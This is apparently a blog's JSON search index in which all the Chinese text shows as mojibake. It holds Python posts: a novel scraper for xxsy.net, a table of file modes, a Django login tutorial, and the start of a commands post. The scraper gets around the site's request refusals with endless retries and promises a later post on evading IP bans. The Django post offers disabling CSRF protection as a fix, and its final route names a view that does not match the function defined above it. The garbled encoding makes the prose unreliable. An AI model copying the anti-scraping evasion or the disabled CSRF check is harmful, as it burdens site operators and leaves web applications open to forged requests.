å½“ç„¶ä¹Ÿå°±ä¸èƒ½copyå®ƒçš„selectorã€‚ è¿™ç§æŒ‰é’®çš„ç‚¹å‡»è‚¯å®šæ˜¯å‘æœåŠ¡å™¨å‘é€äº†è¯·æ±‚çš„ï¼Œæ‰“å¼€fiddlerè¿›è¡ŒæŠ“åŒ…ï¼Œå†æ¬¡ç‚¹å‡»ç›®å½•æŒ‰é’®ï¼Œæ­¤æ—¶å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¯·æ±‚å·²ç»è¢«æˆåŠŸæ•è·ï¼Œç‚¹å‡»è¿™æ¡è¯·æ±‚æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼Œè¿™ä¸ªæ¥å£çš„åŠŸèƒ½å°±æ˜¯æŸ¥è¯¢æ‰€æœ‰çš„ç« èŠ‚ä¿¡æ¯ã€‚ çœŸå®çš„è¯·æ±‚åœ°å€æ˜¯http://www.xxsy.net/partview/GetChapterListNoSub?bookid=945608&amp;isvip=0ï¼Œå…¶ä¸­bookidå°±æ˜¯æˆ‘ä»¬å‰é¢æ‰¾åˆ°çš„bookidï¼Œè¿™é‡Œå¯ä»¥åšæˆå‚æ•°åŒ–ä¾æ¬¡ä¼ å…¥å…¶ä»–å°è¯´çš„IDã€‚ 1234567...url = 'http://www.xxsy.net/partview/GetChapterListNoSub?bookid=945608&amp;isvip=0'titles = BeautifulSoup(requests.get(url).text,'lxml').select('ul &gt; li &gt; a')for title in titles: titlename = title.text #ç« èŠ‚åç§° titleurl = 'http://www.xxsy.net' + title.get('href') #ç« èŠ‚åœ°å€ print(titlename,titleurl) æ­£æ–‡ä¸‹è½½ä¸Šä¸€æ­¥å–åˆ°çš„titleurlæ˜¯æ¯ä¸€ç« èŠ‚çš„é˜…è¯»åœ°å€ï¼Œç›´æ¥requestsè¯·æ±‚å¹¶è§£ææ‹¿åˆ°æ­£æ–‡å†…å®¹ 1contents = BeautifulSoup(requests.get(titleurl).text, 'lxml').select('div#auto-chapter &gt; p') #æ­£æ–‡å†…å®¹ è¿”å›ç»“æœæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªæ®µè½ï¼Œå°†æ¯ä¸€æ®µå†…å®¹å‰åæ— ç”¨çš„æ ‡ç­¾å‰”é™¤å¹¶å†™åˆ°æœ¬åœ°çš„txtæ–‡æœ¬ï¼Œå†™å…¥æ–¹å¼ä¸ºa+,æ¯æ¬¡å†™å…¥æ—¶åœ¨åé¢è¿½åŠ ï¼Œä¸ä¼šè¦†ç›–ä¹‹å‰çš„å†…å®¹ï¼Œæ–‡æœ¬è‡ªåŠ¨æŒ‰ç…§å‰é¢è·å–åˆ°çš„å°è¯´åæ¥å‘½åã€‚ 123456...for content in contents: content = str(content).replace('&lt;p&gt;', '\\n').replace('&lt;/p&gt;', '') f = open(path + '%s.txt' % bookname, 'a+') f.write(content) f.close() åˆ°æ­¤ä¸ºæ­¢ä¸‰ä¸ªæ­¥éª¤å·²ç»å®Œæˆï¼Œå¯ä»¥é¡ºåˆ©çš„çˆ¬ä¸‹ä¸€ä¸ªç« èŠ‚çš„å†…å®¹äº†ï¼Œç°åœ¨é€šè¿‡å‡ ä¸ªforå¾ªç¯å°†è¿™å‡ ä¸ªæ­¥éª¤æ•´åˆï¼Œå°±å¯ä»¥æºæºä¸æ–­çš„å¼€å§‹ä¸‹è½½å°è¯´äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding=utf-8import requests,time,osfrom bs4 import BeautifulSouppath = r'C:\\Users\\lipei\\Desktop\\æ½‡æ¹˜ä¹¦é™¢çˆ¬è™«\\å°è¯´\\\\' #æœ¬åœ°å­˜æ”¾å°è¯´çš„è·¯å¾„def get_books(url): webdata = requests.get(url,timeout=60) soup = BeautifulSoup(webdata.text,'lxml') books = soup.select('div.result-list &gt; ul &gt; li &gt; div &gt; h4 &gt; a') for book in books: bookid = book.get('href').split('/')[-1].split('.')[0] #å°è¯´IDä½œä¸ºä¸‹ä¸€ä¸ªè¯·æ±‚urä¸­çš„å‚æ•° bookname = book.text #å°è¯´åç§° bookurl = 'http://www.xxsy.net' + book.get('href') #å°è¯´urlåœ°å€ if bookname+'.txt' in oldlists: #åˆ¤æ–­æ˜¯å¦å·²ç»ä¸‹è½½è¿‡ï¼Œè‹¥å­˜åœ¨åˆ™è·³è¿‡ continue else: pass print('=====================æ­£åœ¨ä¸‹è½½ã€' + bookname + 'ã€‘=====================') url = 'http://www.xxsy.net/partview/GetChapterListNoSub?bookid=%s&amp;isvip=0' % bookid titles = BeautifulSoup(requests.get(url,timeout=60).text,'lxml').select('ul &gt; li &gt; a') for title in titles: titleurl = 'http://www.xxsy.net' + title.get('href') #ç« èŠ‚urlåœ°å€ titlename = title.text #ç« èŠ‚åç§° # print(titlename,titleurl) try: f = open(path + '%s.txt' % bookname, 'a+') #ç« èŠ‚åç§°å†™åˆ°txtæ–‡æœ¬ f.write('\\n'*2 + titlename + '\\n') f.close() except: pass contents = BeautifulSoup(requests.get(titleurl,timeout=60).text, 'lxml').select('div#auto-chapter &gt; p') for content in contents: content = str(content).replace('&lt;p&gt;', '\\n').replace('&lt;/p&gt;', '') try: f = open(path + '%s.txt' % bookname, 'a+') #æ­£æ–‡å†…å®¹å¸è½½txtæ–‡æœ¬ï¼Œç´§æ¥åœ¨ç« èŠ‚åç§°çš„ä¸‹é¢ f.write(content) f.close() except: pass print(titlename + '[å·²ä¸‹è½½]')if __name__ == \"__main__\": urls = ['http://www.xxsy.net/search?vip=0&amp;sort=2&amp;pn=&#123;&#125;'.format(i) for i in range(6697)] #å…è´¹æ¿å—æ¯ä¸€é¡µçš„urlé€šè¿‡æœ€åçš„pnå‚æ•°æ§åˆ¶ global oldlists oldlists = os.listdir(path) #çˆ¬è™«å¼€å§‹ä¹‹å‰æ£€æŸ¥å½“å‰ç›®å½•å·²æœ‰çš„æ–‡ä»¶ for url in urls: get_books(url) #æ§åˆ¶æ¯å¤©çˆ¬å–çš„æ•°é‡ï¼Œè¾¾åˆ°è¦æ±‚ååœæ­¢ä»»åŠ¡ï¼Œé€šè¿‡ä»»åŠ¡å¼€å§‹å‰åç›®å½•ä¸­çš„æ–‡ä»¶æ•°é‡ç›¸å‡æ¥åˆ¤æ–­ newlists = os.listdir(path) num = len(newlists) - len(oldlists) if num &gt;= 20: print('ä»Šæ—¥ä»»åŠ¡ä¸‹è½½å®Œæ¯•ï¼Œä»Šæ—¥ä¸‹è½½å°è¯´%dæœ¬' % num) break else: pass å†™åœ¨æœ€ååœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°çŸ­æ—¶é—´æŒç»­è¯·æ±‚è¯¥ç½‘ç«™çš„è¯ä¼šå¯èƒ½è¢«æœåŠ¡å™¨æ‹’ç»ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å°ç¦IPï¼Œè¿™å¯èƒ½æ˜¯è¿™ä¸ªç½‘ç«™å”¯ä¸€çš„åçˆ¬æªæ–½äº†ï¼Œç„¶è€Œå¹¶æ²¡æœ‰åµç”¨ï¼Œå°†è¯·æ±‚æ”¾åœ¨ä¸€ä¸ªæ— é™å¾ªç¯é‡Œé¢ï¼Œè‹¥è¢«æ‹’ç»å°±è‡ªåŠ¨é‡è¿ï¼Œè¿ä¸Šä»¥åè·³å‡ºå¾ªç¯ã€‚åé¢å¦‚æœé‡åˆ°å°ç¦IPçš„ç½‘ç«™å†è®²å¦‚ä½•é€šè¿‡æ›´æ¢IPæ¥è§„é¿ã€‚ 1234567...while True: try: webdata = requests.get(url,timeout=60) break #è¿æ¥æˆåŠŸå°±è·³å‡ºå¾ªç¯ except: time.sleep(3) peili","categories":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"pythonæ“ä½œtxtæ–‡æœ¬çš„å‡ ç§æ¨¡å¼","slug":"pythonæ“ä½œtxtæ–‡æœ¬çš„å‡ ç§æ¨¡å¼","date":"2018-03-28T12:30:00.000Z","updated":"2018-12-17T02:30:56.694Z","comments":true,"path":"2018/03/28/pythonæ“ä½œtxtæ–‡æœ¬çš„å‡ ç§æ¨¡å¼/","link":"","permalink":"http://yoursite.com/2018/03/28/python%E6%93%8D%E4%BD%9Ctxt%E6%96%87%E6%9C%AC%E7%9A%84%E5%87%A0%E7%A7%8D%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"æ¨¡å¼ å¯åšæ“ä½œ è‹¥æ–‡ä»¶ä¸å­˜åœ¨ æ˜¯å¦è¦†ç›– r åªèƒ½è¯» æŠ¥é”™ - r+ å¯è¯»å¯å†™ æŠ¥é”™ æ˜¯ w åªèƒ½å†™ åˆ›å»º æ˜¯ w+ å¯è¯»å¯å†™ åˆ›å»º æ˜¯ a åªèƒ½å†™ åˆ›å»º å¦ï¼Œè¿½åŠ å†™ a+ å¯è¯»å¯å†™ åˆ›å»º å¦ï¼Œè¿½åŠ å†™ xx","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸‹ç¯‡ï¼‰","slug":"python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸‹ç¯‡ï¼‰","date":"2018-02-07T14:00:00.000Z","updated":"2019-07-09T11:46:01.414Z","comments":true,"path":"2018/02/07/python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸‹ç¯‡ï¼‰/","link":"","permalink":"http://yoursite.com/2018/02/07/python+django%E5%AE%9E%E7%8E%B0%E7%99%BB%E9%99%86%E5%8A%9F%E8%83%BD%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89/","excerpt":"","text":"åœ¨ã€Špython+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸Šç¯‡ï¼‰ã€‹ä»‹ç»äº†djangoçš„å®‰è£…é…ç½®ï¼Œæœ¬ç‰‡æ–‡ç« ä»‹ç»å¦‚ä½•ç”¨djangoå¿«é€Ÿå®ç°ç™»é™†åŠŸèƒ½ï¼Œå¼€å§‹ä¹‹å‰å…ˆæ‰“å¼€ä¸Šç¯‡åˆ›å»ºçš„é¡¹ç›®ï¼Œå¹¶å¯åŠ¨djangoæœåŠ¡ã€‚ Djangoçš„MTVæ¨¡å‹ M ä»£è¡¨æ¨¡å‹ï¼ˆModelï¼‰ï¼Œå³æ•°æ®å­˜å–å±‚ã€‚ è¯¥å±‚å¤„ç†ä¸æ•°æ®ç›¸å…³çš„æ‰€æœ‰äº‹åŠ¡ï¼š å¦‚ä½•å­˜å–ã€å¦‚ä½•éªŒè¯æœ‰æ•ˆæ€§ã€åŒ…å«å“ªäº›è¡Œä¸ºä»¥åŠæ•°æ®ä¹‹é—´çš„å…³ç³»ç­‰ã€‚T ä»£è¡¨æ¨¡æ¿(Template)ï¼Œå³è¡¨ç°å±‚ã€‚ è¯¥å±‚å¤„ç†ä¸è¡¨ç°ç›¸å…³çš„å†³å®šï¼š å¦‚ä½•åœ¨é¡µé¢æˆ–å…¶ä»–ç±»å‹æ–‡æ¡£ä¸­è¿›è¡Œæ˜¾ç¤ºã€‚V ä»£è¡¨è§†å›¾ï¼ˆViewï¼‰ï¼Œå³ä¸šåŠ¡é€»è¾‘å±‚ã€‚ è¯¥å±‚åŒ…å«å­˜å–æ¨¡å‹åŠè°ƒå–æ°å½“æ¨¡æ¿çš„ç›¸å…³é€»è¾‘ã€‚ ä½ å¯ä»¥æŠŠå®ƒçœ‹ä½œæ¨¡å‹ä¸æ¨¡æ¿ä¹‹é—´çš„æ¡¥æ¢ã€‚ é™¤äº†ä»¥ä¸Šä¸‰å±‚ä¹‹å¤–ï¼Œè¿˜éœ€è¦ä¸€ä¸ªURLåˆ†å‘å™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªä¸ªURLçš„é¡µé¢è¯·æ±‚åˆ†å‘ç»™ä¸åŒçš„Viewå¤„ç†ï¼ŒViewå†è°ƒç”¨ç›¸åº”çš„Modelå’ŒTemplate djangoå·¥ä½œæµç¨‹ç¤ºæ„å›¾ç”¨æˆ·è¯·æ±‚å¯¹åº”çš„åœ°å€åï¼Œç»è¿‡views.pyæ–‡ä»¶ä¸­å‡½æ•°çš„å¤„ç†ï¼Œæ¸²æŸ“åçš„æ•°æ®åŠ è½½åˆ°htmlè¿”å›ç»™ç”¨æˆ·ï¼Œurls.pyã€views.pyã€../templates/xx.htmlè¿™å‡ ä¸ªæ–‡ä»¶åœ¨ä¸‹æ–‡ä¸­ä¼šé¢‘ç¹ç”¨åˆ°ã€‚ å‰ç«¯åœ¨ä¹‹å‰å·²ç»åˆ›å»ºå¥½çš„../sign/templatesç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªindex.htmlæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ã€‚ 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Rayvision Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Rayvision Test&lt;/h1&gt; &lt;form method=\"get\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &lt;button id=\"btn\" type=\"submit\"&gt;ç™»é™†&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; GETè¯·æ±‚ç™»é™†formæ ‡ç­¾çš„methodå±æ€§è®¾ç½®ä¸ºgetï¼Œæäº¤çš„æ—¶å€™å°†ä»¥getæ–¹å¼å»è¯·æ±‚ã€‚æµè§ˆå™¨æ‰“å¼€è¿™ä¸ªhtmlæ–‡ä»¶ï¼Œå¡«å†™ä¹‹å‰åˆ›å»ºå¥½çš„è´¦å·å¹¶ç™»é™†ï¼Œå¯ä»¥çœ‹åˆ°æäº¤çš„å‚æ•°æ·»åŠ åˆ°äº†URLä¸­ï¼Œusernameå’Œpasswordä¸ºHTMLä»£ç ä¸­inputæ ‡ç­¾çš„nameå±æ€§ã€‚ POSTè¯·æ±‚ç™»é™†ä¸€èˆ¬ç½‘ç«™ç™»é™†çš„è¯·æ±‚å¤§éƒ½æ˜¯postè¯·æ±‚ï¼Œè¿™é‡Œæˆ‘ä»¬å°†formæ ‡ç­¾çš„methodå±æ€§ä¿®æ”¹æˆpostï¼Œç„¶åå†å»ç™»é™†ã€‚ 1234567...&lt;form method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &lt;button id=\"btn\" type=\"submit\"&gt;ç™»é™†&lt;/button&gt;&lt;/form&gt;... æ­¤æ—¶å‘ç°è¿”å›çŠ¶æ€ç 403ï¼Œç¦æ­¢è®¿é—®ï¼Œè¿™æ˜¯å› ä¸ºdjangoé’ˆå¯¹CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æœ‰ä¿æŠ¤æªæ–½ï¼Œåœ¨ç”Ÿæˆçš„æ¯ä¸ªè¡¨å•ä¸­æ”¾ç½®ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆçš„ä»¤ç‰Œï¼Œé€šè¿‡è¿™ä¸ªä»¤ç‰Œåˆ¤æ–­POSTè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€ä¸ªç½‘ç«™ã€‚ è§£å†³åŠæ³•ä¸€ï¼šåœ¨ä¸Šé¢çš„HTMLä¸­ä½¿ç”¨djangoçš„æ¨¡æ¿æ ‡ç­¾æ·»åŠ CSRFä»¤ç‰Œï¼Œåœ¨formè¡¨å•ä¸­æ·»åŠ å¦‚ä¸‹ã€‚ è§£å†³åŠæ³•äºŒï¼šç›´æ¥å¿½ç•¥è¿™ä¸ªCSRFæ£€æŸ¥ï¼Œåœ¨../guest/settings.pyæ–‡ä»¶ä¸­æ³¨é‡Šæ‰csrfï¼Œå¦‚ä¸‹å›¾ã€‚ å†å»è¯·æ±‚ç™»é™†å°±ä¸ä¼šæŠ¥é”™ï¼Œæ­¤æ—¶è¯·æ±‚ç™»é™†åæ²¡æœ‰ä»»ä½•ååº”ï¼Œå› ä¸ºè¿˜æ²¡æœ‰è®¾ç½®ç™»å½•åè·³è½¬çš„åœ°æ–¹ã€‚ å¤„ç†ç™»é™†è¯·æ±‚ç°åœ¨å·²ç»å†™å¥½äº†è¯·æ±‚çš„å‰ç«¯ï¼Œä¹Ÿæœ‰äº†è¯·æ±‚å‚æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯äº¤ç»™djangoæœåŠ¡å™¨æ¥å¤„ç†è¯·æ±‚ï¼Œé¦–å…ˆé€šè¿‡formè¡¨å•çš„actionå±æ€§æ¥æŒ‡å®šæäº¤çš„è·¯å¾„ã€‚ 123...&lt;form method=\"post\" action=\"/login_action/\"&gt;... å†æ‰“å¼€../guest/urls.pyæ–‡ä»¶æ·»åŠ /login_action/çš„è·¯ç”±ã€‚ 12345from sign import viewsurlpatterns = [ ... url(r'^login_action/', views.login_action), ç„¶ååœ¨../sign/views.pyæ–‡ä»¶ç¼–å†™å¤„ç†ç™»é™†çš„login_actionå‡½æ•°ã€‚ 123456789101112131415161718from django.shortcuts import renderfrom django.http import HttpResponsefrom django.contrib import auth#ç™»é™†def login_action(request): if request.method == 'POST': username = request.POST.get('username', '') password = request.POST.get('password', '') user = auth.authenticate(username=username, password=password) if user is not None: auth.login(request, user) # ç™»å½• request.session['user'] = username # å°†sessionä¿¡æ¯è®°å½•åˆ°æµè§ˆå™¨ return HttpResponse('login success!') else: return render(request,'index.html', &#123;'error': 'username or password error!'&#125;) else: return render(request,'index.html') é¦–å…ˆåˆ¤æ–­è¯·æ±‚çš„æ–¹æ³•æ˜¯å¦æ˜¯POSTï¼Œä¸æ˜¯çš„è¯è¿”å›è¯¥é¡µé¢ã€‚ request.POST.getæ–¹æ³•è·å–å‰ç«¯ä¼ å…¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ­¤å¤„çš„usernameå’Œpasswordå°±æ˜¯htmlæ–‡ä»¶é‡Œformè¡¨å•éƒ¨åˆ†é‚£ä¸¤ä¸ªinputæ ‡ç­¾çš„nameå±æ€§ã€‚ djangoå·²ç»å¸®æˆ‘ä»¬åšå¥½ç”¨æˆ·ä½“ç³»ï¼Œä½¿ç”¨authenticate()å‡½æ•°è®¤è¯ä¼ å…¥çš„ç”¨æˆ·åå’Œå¯†ç ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç”¨æˆ·å username å’Œå¯†ç  passwordï¼Œä¸æ•°æ®åº“ä¸­çš„è´¦æˆ·åšå¯¹æ¯”ï¼Œç”¨æˆ·åå¯†ç æ­£ç¡®çš„æƒ…å†µä¸‹è¿”å›ç»™userå¯¹è±¡ã€‚å¦‚æœç”¨æˆ·åå¯†ç ä¸æ­£ç¡®ï¼Œåˆ™authenticate()è¿”å› Noneã€‚ ifè¯­å¥åˆ¤æ–­authenticate()è¿”å›å¦‚æœä¸ä¸º Noneï¼Œè¯´æ˜ç”¨æˆ·è®¤è¯é€šè¿‡ï¼Œæ¥ä¸‹æ¥è°ƒç”¨ auth.login()å‡½æ•°è¿›è¡Œç™»é™†ï¼Œé€šè¿‡HttpResponseç±»è¿”å›ç™»é™†æˆåŠŸçš„æç¤ºã€‚ è®¤è¯å¤±è´¥çš„è¯ï¼Œåˆ™æç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œç°åœ¨é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºé”™è¯¯æç¤ºçš„åœ°æ–¹ï¼Œè¿™é‡Œæˆ‘ä»¬å†æ¬¡ç”¨åˆ°djangoçš„æ¨¡æ¿è¯­è¨€ï¼Œåœ¨å¯†ç è¾“å…¥æ¡†ä¸‹æ–¹æ·»åŠ ï¼Œå®ƒå¯¹åº”ç™»é™†å‡½æ•°ä¸­renderè¿”å›å­—å…¸ä¸­çš„ keyï¼Œå¹¶ä¸”åœ¨ç™»å½•å¤±è´¥çš„é¡µé¢ä¸­æ˜¾ç¤º valueï¼Œå³â€username or password error!â€ä¿¡æ¯ã€‚ 12345678...&lt;form method=\"post\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &#123;&#123; error &#125;&#125;&lt;br&gt; &lt;button id=\"btn\" type=\"submit\"&gt;ç™»é™†&lt;/button&gt;&lt;/form&gt;... æ•ˆæœå›¾ å¢å¼ºä¸ç¾åŒ–ä¸Šé¢æˆ‘ä»¬å·²ç»å®ç°äº†åŸºæœ¬çš„ç™»é™†åŠŸèƒ½ï¼Œä½†æ˜¯æ˜¯æ¯”è¾ƒç²—ç³™çš„ï¼Œç™»é™†æˆåŠŸååªä¸´æ—¶ç”¨HttpResponseç±»æç¤ºï¼Œæ²¡æœ‰å®é™…æ„ä¹‰ï¼Œé¡µé¢ä¹Ÿä¸å¤Ÿç¾è§‚ï¼Œæ¥ä¸‹æ¥å†å†™ä¸€ä¸ªç™»é™†æˆåŠŸåè·³è½¬çš„ä¸»é¡µï¼Œå¹¶å°†ç™»é™†é¡µé¢ç¨ä½œç¾åŒ–ã€‚ ç™»é™†ç•Œé¢ç¾åŒ–è¿™é‡Œæ¨èä¸€ä¸ªæ¯”è¾ƒä¼˜ç§€çš„å‰ç«¯æ¡†æ¶Semantic UIï¼Œç›¸æ¯”äºBootstrapå’ŒFoundationï¼Œå®ƒæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éå¸¸çš„è¯­ä¹‰åŒ–ï¼Œå®šåˆ¶åŒ–ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚åœ¨æœ¬åœ°æˆ–è€…ç½‘ç»œä¸Šå¯¼å…¥semantic.cssï¼Œè‹¥åœ¨æœ¬åœ°å¯¼å…¥çš„è¯ï¼Œå°†ä¸‹è½½çš„semantic.cssæ–‡ä»¶æ”¾åœ¨../static/css/ç›®å½•ä¸‹ï¼Œç„¶åæŠŠä¹‹å‰åšå¥½çš„ç™»é™†é¡µé¢ç¨ä½œä¿®æ”¹ã€‚ 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Rayvision Test&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"../static/css/semantic.css\"&gt;&lt;/head&gt;&lt;body style=\"background-color: rgb(230,230,230)\"&gt; &lt;div class=\"ui center aligned grid\" style=\"margin-top: 200px\"&gt; &lt;div class=\"ui six wide column\"&gt; &lt;h1 class=\"ui teal header\"&gt;RAYVISION - TEST&lt;/h1&gt; &lt;div class=\"ui segment\"&gt; &lt;div class=\"ui content\"&gt; &lt;form class=\"ui form\" method=\"post\" action=\"/login_action/\"&gt; &lt;div class=\"field\"&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"username\"&gt;&lt;br&gt; &lt;/div&gt; &lt;div class=\"field\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"password\"&gt;&lt;br&gt; &lt;/div&gt; &#123;&#123; error &#125;&#125;&lt;br&gt; &lt;button class=\"ui fluid large teal button\" type=\"submit\"&gt;ç™»é™†&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç™»å½•åé¡µé¢åœ¨../sign/templatesç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªtest_manage.htmlæ–‡ä»¶ï¼Œåœ¨é‡Œé¢å†™å¥½éœ€è¦çš„å†…å®¹ã€‚ç„¶ååœ¨../sign/views.pyæ–‡ä»¶ä¸­ä¹‹å‰å†™å¥½çš„login_actionå‡½æ•°åšä¿®æ”¹ï¼Œå°†HttpResponseæ”¹ä¸ºHttpResponseRedirectï¼Œå®ƒå¯ä»¥å¯¹è·¯å¾„è¿›è¡Œé‡å®šå‘ï¼Œä»è€Œå°†ç™»å½•æˆåŠŸä¹‹åçš„è¯·æ±‚æŒ‡å‘/test_manage/ç›®å½•ã€‚æ¥ç€åœ¨views.pyæ–‡ä»¶ä¸­ç»§ç»­åˆ›å»º test_manage å‡½æ•°ï¼Œç”¨äºè¿”å›test_manage.html é¢é¡µã€‚ 1234567891011121314151617181920212223242526from django.shortcuts import renderfrom django.http import HttpResponse,HttpResponseRedirectfrom django.contrib import auth#ç™»é™†def login_action(request): if request.method == 'POST': username = request.POST.get('username', '') password = request.POST.get('password', '') user = auth.authenticate(username=username, password=password) if user is not None: auth.login(request, user) # ç™»å½• request.session['user'] = username # å°†sessionä¿¡æ¯è®°å½•åˆ°æµè§ˆå™¨ response = HttpResponseRedirect('/test_manage/') return response else: return render(request,'index.html', &#123;'error': 'username or password error!'&#125;) else: return render(request,'index.html')#æµ‹è¯•é¡¹ç›®ç®¡ç†é¡µé¢def test_manage(request): ... return render(request, \"test_manage.html\") ... æœ€åä¸è¦å¿˜è®°åœ¨../guest/urls.py æ–‡ä»¶ä¸­æ·»åŠ è·¯å¾„ test_manage/çš„è·¯ç”±ã€‚ 1234567...from sign import viewsurlpatterns = [ ... url(r'^test_manage/$', views.event_manage),] æ•ˆæœå›¾ å†™åœ¨æœ€ådjangoå®ç°ç™»é™†åŠŸèƒ½ä¸Šä¸‹ç¯‡å·²ç»å®Œç»“ï¼Œä½†æ˜¯è¿™é‡Œä»‹ç»çš„æ˜¯æœ€åŸºæœ¬çš„ç™»é™†åŠŸèƒ½ï¼Œç”¨çš„æ˜¯djangoè‡ªåŠ¨ç”Ÿæˆçš„userè¡¨é‡Œçš„æ•°æ®ï¼Œä¹Ÿä»…ä»…å®ç°äº†ä¸»æµç¨‹ï¼Œå…·ä½“é¡¹ç›®ä¸­æŒ‰ç…§éœ€è¦åˆ›å»ºæ–°çš„æ•°æ®è¡¨ï¼Œæ ¹æ®ä¸¥è°¨çš„æµ‹è¯•æ€ç»´ï¼Œæˆ‘ä»¬åœ¨å¼€å‘é˜¶æ®µå°±è¦å°½å¯èƒ½å¤šçš„æƒ³åˆ°å¼‚å¸¸åœºæ™¯ï¼Œä¾‹å¦‚ç”¨æˆ·åå¯†ç ä¸ºç©ºï¼Œç‰¹æ®Šå­—ç¬¦ï¼Œé•¿åº¦é™åˆ¶ç­‰ï¼Œåœ¨å‰é¢çš„ç™»é™†å¤„ç†å‡½æ•°ä¸­é€šè¿‡ifæ¥åˆ¤æ–­ï¼Œå¦å¤–æˆ‘ä»¬çš„è¯·æ±‚æ˜¯å°†å¯†ç æ˜æ–‡å‘é€å‡ºå»çš„ï¼Œç›¸å½“ä¸å®‰å…¨ï¼Œå› æ­¤è¿˜éœ€å†å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­å¼•å…¥æ‰€éœ€çš„åŠ å¯†æ¨¡å—å°†å¯†ç åŠ å¯†ã€‚ ç›¸å…³æ–‡ç« python+djangoå®ç°ç™»é™†åŠŸèƒ½ï¼ˆä¸Šç¯‡ï¼‰xx","categories":[{"name":"Webå¼€å‘","slug":"Webå¼€å‘","permalink":"http://yoursite.com/categories/Web%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"},{"name":"semantic UI","slug":"semantic-UI","permalink":"http://yoursite.com/tags/semantic-UI/"},{"name":"html","slug":"html","permalink":"http://yoursite.com/tags/html/"},{"name":"css","slug":"css","permalink":"http://yoursite.com/tags/css/"}]},{"title":"å¸¸ç”¨å°å‘½ä»¤ï¼ˆé•¿æœŸæ›´æ–°ï¼‰","slug":"å¸¸ç”¨å°å‘½ä»¤","date":"2018-01-30T01:30:00.000Z","updated":"2018-12-17T02:30:56.685Z","comments":true,"path":"2018/01/30/å¸¸ç”¨å°å‘½ä»¤/","link":"","permalink":"http://yoursite.com/2018/01/30/%E5%B8%B8%E7%94%A8%E5%B0%8F%E5%91%BD%E4%BB%A4/","excerpt":"","text":"å‰è¨€åœ¨å¹³æ—¶çš„æµ‹è¯•å·¥ä½œæˆ–è€…è‡ªå·±é—²æ—¶åšçš„é¡¹ç›®ä¸­ï¼Œæœ‰ä¸€äº›æ“ä½œå¯èƒ½æ˜¯ç»å¸¸ç”¨åˆ°ï¼Œæ¯æ¬¡é‡å¤å†™æ¯”è¾ƒè´¹æ—¶ï¼Œä¾‹å¦‚æ‰¹é‡ç”Ÿæˆï¼Œå¤åˆ¶ä¸€äº›æ–‡ä»¶ã€æ–‡ä»¶å¤¹ï¼ŒæŸä¸ªwebé¡µé¢çš„è‡ªåŠ¨åŒ–ç­‰ï¼Œå…¶ä¸­æœ‰äº›æ˜¯Windowsç³»ç»Ÿå‘½ä»¤ï¼Œæœ‰äº›æ˜¯pythonçš„å‘½ä»¤ï¼Œç‰¹å¼€ä¸€è´´è®°å½•ï¼Œå°†å¸¸ç”¨çš„æ“ä½œéƒ½é€šè¿‡pythonæ¥è°ƒç”¨æ‰§è¡Œï¼Œå†…å®¹å¯èƒ½